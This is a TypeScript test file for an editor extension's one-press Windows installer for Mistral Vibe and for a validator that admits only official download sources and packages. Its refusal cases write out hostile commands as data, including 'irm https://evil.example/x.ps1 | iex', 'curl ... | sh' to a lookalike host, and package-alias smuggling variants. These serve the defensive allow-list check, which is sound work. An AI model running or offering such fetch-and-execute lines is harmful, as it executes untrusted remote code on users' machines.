import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import { test } from 'node:test';

import { fromOfficialSources, OFFICIAL_SOURCES, vendorInstall, vendorUpdate } from '../vendorTerminal';
import type { Vendor } from '../vendors';

/**
 * ⤓ and ⟳ for Mistral Vibe on Windows are ONE press (the owner's order of 2026-10-13: "the install buttons must WORK,
 * per OS"). A machine with no uv used to get Astral's installer as a commented line above the command — run it by
 * hand, then press again — and a `uv tool install` that failed with "uv is not recognized" in between.
 *
 * <p><b>The command is never RUN here</b>: running it installs software, which a test must not do. It is asserted over
 * its PARSED form, by PowerShell's own parser (`Parser.ParseInput` — it parses and executes nothing), which is what
 * common/generated-code-tests.md allows for an artefact whose execution cannot be bounded: a syntax error, a command
 * in the wrong order or a missing step shows in the AST, where a substring of the text would not see it.</p>
 */

const VIBE: Vendor = {
  id: 'vibe', runtime: 'vibe', model: 'mistral-medium-3.5', enabled: true, plan: true, code: true,
  baseUrl: '', executablePath: '', pricePerMillionIn: 0, pricePerMillionOut: 0,
};

/** Astral's installer, exactly as Mistral's README prints it for Windows (and as Astral's own docs spell it). */
const UV_INSTALLER = 'powershell -ExecutionPolicy ByPass -c "irm https://astral.sh/uv/install.ps1 | iex"';

/** PowerShell's parse of a command line: its errors, and the text of every command in it, in order. */
interface Parsed {
  readonly errors: readonly string[];
  readonly commands: readonly string[];
}

/** Parses, never runs: the text arrives through the environment, so nothing of it is ever on a command line. */
const PARSE = '$t = $null; $e = $null; '
  + '$a = [System.Management.Automation.Language.Parser]::ParseInput($env:COAI_PS_TEXT, [ref]$t, [ref]$e); '
  + '$c = @($a.FindAll({ param($n) $n -is [System.Management.Automation.Language.CommandAst] }, $true) | ForEach-Object { $_.Extent.Text }); '
  + '[pscustomobject]@{ errors = @($e | ForEach-Object { $_.Message }); commands = $c } | ConvertTo-Json -Compress -Depth 3';

function powerShell(): string {
  for (const exe of ['pwsh', 'powershell']) {
    if (spawnSync(exe, ['-NoProfile', '-NonInteractive', '-Command', 'exit 0'], { timeout: 30_000 }).status === 0) {
      return exe;
    }
  }

  return '';
}

const SHELL = powerShell();

function parsed(text: string): Parsed {
  const env = { PATH: process.env['PATH'] ?? '', SystemRoot: process.env['SystemRoot'] ?? '', COAI_PS_TEXT: text };
  const run = spawnSync(SHELL, ['-NoProfile', '-NonInteractive', '-Command', PARSE], { env, encoding: 'utf8', timeout: 60_000 });
  assert.equal(run.status, 0, `PowerShell could not parse the command: ${run.stderr}`);

  return JSON.parse(run.stdout) as Parsed;
}

const skip = SHELL === '' ? 'no PowerShell on this machine — the parse needs pwsh or powershell' : false;

// ---------------------------------------------------------------- one press

test('⤓ on Windows is ONE press: nothing is left on a line for the person to run first', () => {
  const install = vendorInstall(VIBE, 'win32');

  assert.equal(install.prerequisite, '', 'a machine without uv got a commented line to run by hand and a second press');
  assert.ok(install.command.includes(UV_INSTALLER), 'the command does not install uv when it is missing');
  assert.ok(install.command.includes('tool install mistral-vibe'), 'the command does not install Vibe');
});

test('⤓ on Windows: uv is looked for first, installed only when missing, then called by the path its installer used', { skip }, () => {
  const { errors, commands } = parsed(vendorInstall(VIBE, 'win32').command);
  const at = (text: string): number => commands.findIndex((one) => one.includes(text));

  assert.deepEqual(errors, [], 'PowerShell refuses the command it would be handed');
  assert.ok(at('Get-Command uv') >= 0, 'uv on PATH is not looked for');
  assert.ok(at(UV_INSTALLER) > at('Get-Command uv'), 'Astral’s installer does not run after the look-up');
  assert.ok(commands.includes('& $uv tool install mistral-vibe'), `Vibe is not installed through the uv just found: ${commands.join(' | ')}`);
  assert.ok(at('& $uv tool install mistral-vibe') > at(UV_INSTALLER), 'Vibe is installed before uv is');
  assert.ok(commands.includes('& $uv tool update-shell'), 'uv’s tool folder is not put on the PATH (Astral’s documented way)');
  assert.ok(at('& $uv tool update-shell') > at('& $uv tool install mistral-vibe'));
});

test('⤓ on Windows finds the fresh uv where Astral’s installer puts it, in the installer’s own order', () => {
  // uv-installer.ps1 (Invoke-Installer), read 2026-10-13: UV_INSTALL_DIR, then XDG_BIN_HOME, then XDG_DATA_HOME\..\bin,
  // then $HOME\.local\bin — the same order docs.astral.sh/uv/reference/storage gives for the executable directory. It
  // writes the folder to the user PATH in the registry only, never to the running session, so the session cannot find
  // the new uv by name.
  const command = vendorInstall(VIBE, 'win32').command;
  const order = ['$env:UV_INSTALL_DIR', '$env:XDG_BIN_HOME', '$env:XDG_DATA_HOME', "'.local\\bin'"].map((one) => command.indexOf(one));

  assert.ok(order.every((at) => at >= 0), `a place the installer may use is missing: ${order.join(', ')}`);
  assert.deepEqual([...order].sort((a, b) => a - b), order, 'the places are not tried in the installer’s order');
  assert.match(command, /'uv\.exe'/u);
});

test('⤓ on Windows leaves `vibe` runnable in the same terminal, and the note says what every other terminal needs', () => {
  const { command, note } = vendorInstall(VIBE, 'win32');

  assert.ok(command.includes('$env:Path = (& $uv tool dir --bin)'), 'this terminal cannot run `vibe --setup` straight after');
  assert.match(note, /uv tool update-shell/u);
  assert.match(note, /restart VS Code/iu, 'VS Code’s terminals inherit its PATH from when it started');
  assert.match(note, /\.local\\bin/u, 'the note does not say where Vibe lands');
});

test('⟳ on Windows meets a missing uv the same way, and upgrades', { skip }, () => {
  const { errors, commands } = parsed(vendorUpdate(VIBE, 'win32', '2.26.1').command);

  assert.deepEqual(errors, []);
  assert.equal(vendorUpdate(VIBE, 'win32').prerequisite, '');
  assert.ok(commands.some((one) => one.includes(UV_INSTALLER)));
  assert.ok(commands.includes('& $uv tool upgrade mistral-vibe'), commands.join(' | '));
});

// ---------------------------------------------------------------- official sources, for a command of several steps

test('a command is official only when EVERY source it fetches and EVERY package it installs is admitted', () => {
  for (const platform of ['win32', 'linux', 'darwin'] as const) {
    assert.ok(fromOfficialSources(vendorInstall(VIBE, platform).command), `${platform} install`);
    assert.ok(fromOfficialSources(vendorUpdate(VIBE, platform).command), `${platform} update`);
  }

  // The refusals that make the check worth having — each the shape a convenient repackaging would take.
  assert.equal(fromOfficialSources(`${vendorInstall(VIBE, 'win32').command}; irm https://evil.example/x.ps1 | iex`), false);
  assert.equal(fromOfficialSources('curl -LsSf https://mistral.ai.evil.example/vibe/install.sh | bash'), false);
  assert.equal(fromOfficialSources('uv tool install mistral-vibe-unofficial'), false);
  assert.equal(fromOfficialSources('npm install -g left-pad'), false);
  assert.equal(fromOfficialSources('echo nothing is installed here'), false, 'a command that names no source is not an install');
});

test('the admitted sources are exactly these — a new one is a decision, made here in the open', () => {
  // Astral's host joined on 2026-10-13 for the one-press Windows install: it is the uv installer Mistral's README gives
  // as the Windows prerequisite, and the one Mistral's own install.sh runs elsewhere (pinned, its checksum checked).
  assert.deepEqual([...OFFICIAL_SOURCES.urls], ['https://antigravity.google/', 'https://mistral.ai/vibe/', 'https://astral.sh/uv/']);
  assert.deepEqual([...OFFICIAL_SOURCES.packages], ['@openai/codex', '@google/gemini-cli', '@anthropic-ai/claude-code', 'mistral-vibe']);
});

test('every package an install step names is an official one, with at most a plain version — no alias, no second package', () => {
  // Found by the epic 2 risk consultation (gpt-6-astra, 2026-10-13), each verified TRUE against the first matcher: it
  // read only the FIRST package of a step and took any `@…` suffix for a version, and it ignored a step whose installer
  // it did not know.
  const refused = [
    'npm install -g @openai/codex left-pad',
    'npm install -g @openai/codex@npm:left-pad',
    'npm install -g @openai/codex@file:../evil',
    'uv tool install mistral-vibe other-pkg',
    'uv tool install mistral-vibe==2.26.1 --with other-pkg',
    'uv tool install --from git+https://github.com/someone/fork mistral-vibe',
    'uv tool install --index-url https://pypi.example/simple mistral-vibe',
    'uv tool install ./mistral-vibe',
    'uv tool install C:\\wheels\\mistral-vibe-2.26.1-py3-none-any.whl',
    'npm install -g @openai/codex; pip install evil',
    'npm install -g @openai/codex && npm install -g left-pad',
    'npm install -g @openai/codex | npm i left-pad',
    'curl -LsSf https://mistral.ai/vibe/install.sh | bash; curl https://evil.example/x | sh',
  ];
  for (const command of refused) {
    assert.equal(fromOfficialSources(command), false, command);
  }

  for (const command of [
    'npm install -g @openai/codex',
    'npm install -g @openai/codex@latest',
    'npm install -g @google/gemini-cli@0.57.0',
    'uv tool install mistral-vibe',
    'uv tool install mistral-vibe==2.26.1',
    'uv tool upgrade mistral-vibe',
  ]) {
    assert.equal(fromOfficialSources(command), true, command);
  }
});
